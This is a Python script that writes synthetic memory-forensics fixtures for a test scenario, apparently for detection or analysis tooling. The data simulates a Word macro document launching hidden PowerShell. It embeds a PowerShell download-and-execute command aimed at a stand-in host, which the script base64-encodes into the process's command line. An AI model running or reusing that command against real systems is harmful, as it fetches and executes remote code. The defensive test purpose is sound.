"""Regenerate the golden fixtures of scenario WS-042 (CLAUDE.md §10). Output is committed.
Run in the container: python tests/scenario_ws042/make_fixtures.py"""
import base64
import json
from pathlib import Path

HERE = Path(__file__).parent / "fixtures"
PAYLOAD = "IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.10/a.ps1')"
ENC = base64.b64encode(PAYLOAD.encode("utf-16-le")).decode()


def proc(pid, ppid, name, created, children=()):
    return {"PID": pid, "PPID": ppid, "ImageFileName": name,
            "Offset(V)": 0xFFFFFA8000000000 + pid, "Threads": 4, "CreateTime": created,
            "ExitTime": None, "__children": list(children)}


def t(hms: str) -> str:
    return f"2026-10-06T{hms}+00:00"


PS = [proc(4, 0, "System", t("08:00:00")), proc(252, 4, "smss.exe", t("08:00:01")),
      proc(400, 320, "wininit.exe", t("08:00:05")), proc(480, 400, "services.exe", t("08:00:06")),
      proc(490, 400, "lsass.exe", t("08:00:06")), proc(600, 480, "svchost.exe", t("08:00:08")),
      proc(2000, 1980, "explorer.exe", t("08:05:00")),
      proc(2980, 2000, "WINWORD.EXE", t("14:28:30")),
      proc(4312, 2980, "powershell.exe", t("14:30:07"))]
TREE = [proc(4, 0, "System", t("08:00:00"), [proc(252, 4, "smss.exe", t("08:00:01"))]),
        proc(2000, 1980, "explorer.exe", t("08:05:00"), [
            proc(2980, 2000, "WINWORD.EXE", t("14:28:30"), [
                proc(4312, 2980, "powershell.exe", t("14:30:07"))])])]
CMD = [{"PID": 2980, "Process": "WINWORD.EXE",
        "Args": '"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE" /n '
                '"C:\\Users\\alice\\Downloads\\invoice.docm"', "__children": []},
       {"PID": 4312, "Process": "powershell.exe",
        "Args": f"powershell.exe -NoP -W Hidden -enc {ENC}", "__children": []}]
NET = [{"Offset": 1, "Proto": "TCPv4", "LocalAddr": "0.0.0.0", "LocalPort": 135,
        "ForeignAddr": "0.0.0.0", "ForeignPort": 0, "State": "LISTENING", "PID": 600,
        "Owner": "svchost.exe", "Created": None, "__children": []},
       {"Offset": 2, "Proto": "TCPv4", "LocalAddr": "10.0.0.42", "LocalPort": 49700,
        "ForeignAddr": "10.0.0.10", "ForeignPort": 445, "State": "ESTABLISHED", "PID": 4,
        "Owner": "System", "Created": None, "__children": []},
       {"Offset": 3, "Proto": "TCPv4", "LocalAddr": "10.0.0.42", "LocalPort": 49710,
        "ForeignAddr": "203.0.113.10", "ForeignPort": 443, "State": "ESTABLISHED", "PID": 4312,
        "Owner": "powershell.exe", "Created": t("14:30:09"), "__children": []}]

if __name__ == "__main__":
    HERE.mkdir(exist_ok=True)
    for name, data in (("windows.pslist.PsList", PS), ("windows.pstree.PsTree", TREE),
                       ("windows.cmdline.CmdLine", CMD), ("windows.netscan.NetScan", NET)):
        (HERE / f"{name}.json").write_text(json.dumps(data, indent=1) + "\n", encoding="utf-8")
    print("fixtures written to", HERE)
